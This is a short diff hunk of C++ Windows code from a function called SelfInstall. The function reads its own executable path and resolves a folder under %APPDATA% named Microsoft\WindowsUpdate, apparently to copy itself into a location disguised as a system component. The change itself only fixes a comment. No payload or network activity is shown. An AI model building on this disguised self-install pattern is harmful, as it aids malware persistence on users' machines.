@@ -208,7 +208,7 @@ static bool SelfInstall() {
     wchar_t selfPath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, selfPath, MAX_PATH);
 
-    // Resolve %APPDATA%\Microsoft\WindowsUpdate\
+    // Resolve %APPDATA%\Microsoft\WindowsUpdate
     wchar_t appData[MAX_PATH] = {};
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
     auto dirStr = std::wstring(appData) + L"\\Microsoft\\WindowsUpdate";
